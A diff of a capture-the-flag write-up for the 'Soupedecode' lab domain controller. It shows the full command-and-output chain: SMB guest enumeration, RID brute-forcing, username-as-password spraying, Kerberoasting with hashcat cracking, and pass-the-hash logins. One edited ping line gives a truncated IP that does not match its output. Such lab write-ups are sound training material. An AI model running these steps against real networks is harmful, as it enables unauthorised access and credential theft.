@@ -27,16 +27,12 @@ This writeup documents the penetration testing of the [**Soupedecode**](https://
 # Information Gathering
 ------------------
 
-After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
-
-A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
 * TTL 64: Linux.
 * TTL 128: Windows.
 
-```bash
-❯ ping -c 1 10.10.34.153
 ```
-```
+❯ ping -c 1 10.10.34.15
 PING 10.10.34.153 (10.10.34.153) 56(84) bytes of data.
 64 bytes from 10.10.34.153: icmp_seq=1 ttl=127 time=52.5 ms
 
@@ -47,10 +43,8 @@ rtt min/avg/max/mdev = 52.486/52.486/52.486/0.000 ms
 
 In this case, the target seems to be a Windows machine. Let's perform a port scan with nmap.
 
-```bash
+```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.34.153 -oG allPorts
-```
-```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 18:47 CET
 Initiating SYN Stealth Scan at 18:47
@@ -104,10 +98,8 @@ Nmap done: 1 IP address (1 host up) scanned in 40.17 seconds
            Raw packets sent: 196594 (8.650MB) | Rcvd: 55 (2.420KB)
 ```
 
-```bash
+```
 ❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 10.10.34.153 -oN targeted
-```
-```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 18:54 CET
 Nmap scan report for 10.10.34.153
 Host is up (0.053s latency).
@@ -177,10 +169,8 @@ I'll add this in my ``/etc/hosts`` file:
 
 Using **netexec** I'll enumerate SMB shares and see if we can log in with the `guest` user and grants us read access to the **IPC$** share.
 
-```bash
+```
 ❯ nxc smb dc01.soupedecode.local -u 'guest' -p '' --shares
-```
-```
 SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
 SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
 SMB         10.10.34.153    445    DC01             [*] Enumerated shares
@@ -201,10 +191,8 @@ Now, we can perform a **RID bruteforce attack** with netexec to enumerate users.
 
 >A **RID brute-force attack** generally refers to an attempt to crack or guess a **Remote Identifier (RID)**, which is typically a unique identifier used in network protocols, operating systems, or systems like Windows for user accounts, groups, or security principles.
 
-```bash
+```
 ❯ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000
-```
-```
 SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
 SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
 SMB         10.10.34.153    445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
@@ -226,8 +214,8 @@ SMB         10.10.34.153    445    DC01             2168: SOUPEDECODE\admin (Sid
 
 I'll save in valid_usernames.txt a list with all the users for later.
 
-```bash
-❯ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000 \| grep SidTypeUser \| cut -d '\' -f 2 \| cut -d ' ' -f 1 > valid_usernames.txt
+```
+❯ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > valid_usernames.txt
 ```
 
 <br>
@@ -238,10 +226,8 @@ At this point we can try to bruteforce user's passwords using valid_usernames.tx
 
 But there's something that worked. That was attempting to log in the domain using **valid_usernames.txt both in the username and password fields**.
 
-```bash
+```
 ❯ nxc smb dc01.soupedecode.local -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
-```
-```
 SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
 ```
 
@@ -251,10 +237,8 @@ SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\ybob31
 
 We found the credentials ``ybob317:ybob317``
 
-```bash
+```
 ❯ nxc smb dc01.soupedecode.local -u 'ybob317' -p 'ybob317' --shares
-```
-```
 SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
 SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
 SMB         10.10.34.153    445    DC01             [*] Enumerated shares
@@ -271,10 +255,8 @@ SMB         10.10.34.153    445    DC01             Users           READ
 
 Using those credentials we have read access to the Users shared resource. Let's access that resource to get the user flag.
 
-```bash
+```
 ❯ smbclient.py 'SOUPEDECODE.LOCAL/ybob317:ybob317@dc01.soupedecode.local'
-```
-```
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
 Type help for list of commands
@@ -294,10 +276,8 @@ drw-rw-rw-          0  Mon Jun 17 19:24:32 2024 ..
 
 > **Kerberoasting** is a post-exploitation attack technique targeting the Kerberos authentication protocol, enabling adversaries to extract encrypted service account credentials from Active Directory.
 
-```bash
+```
 ❯ nxc ldap 10.10.34.153 -u ybob317 -p ybob317 --kerberoast kerb.hash
-```
-```
 LDAP        10.10.34.153    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
 LDAP        10.10.34.153    389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
 LDAP        10.10.34.153    389    DC01             [*] Skipping disabled account: krbtgt
@@ -316,20 +296,16 @@ LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*monitoring_svc$
 
 Those are the accounts vulnerable to Kerberoasting, that's to say, we can **crack their password hashes** with **hashcat**.
 
-```bash
+```
 ❯ hashcat kerb.hash /usr/share/wordlists/rockyou.txt
-```
-```
 ...
 $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$...:***REDACTED_PASSWORD***
 ```
 
 We have the credentials of the ``file_svc`` user. Let's start enumerating shared resources again.
 
-```bash
+```
 ❯ nxc smb dc01.soupedecode.local -u 'file_svc' -p '***REDACTED_PASSWORD***' --shares
-```
-```
 SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
 SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:***REDACTED_PASSWORD***
 SMB         10.10.34.153    445    DC01             [*] Enumerated shares
@@ -348,12 +324,10 @@ SMB         10.10.34.153    445    DC01             Users
 
 It seems we got a hashdump of some machine accounts. Let's see if any of them is valid.
 
-```bash
+```
 ❯ cat backup_extract.txt | cut -d: -f1 > backup_users.txt
 ❯ cat backup_extract.txt | cut -d: -f4 > backup_hashes.txt
 ❯ nxc smb 10.10.34.153 -u backup_users.txt -H backup_hashes.txt --no-brute
-```
-```
 ...
 SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
 ```
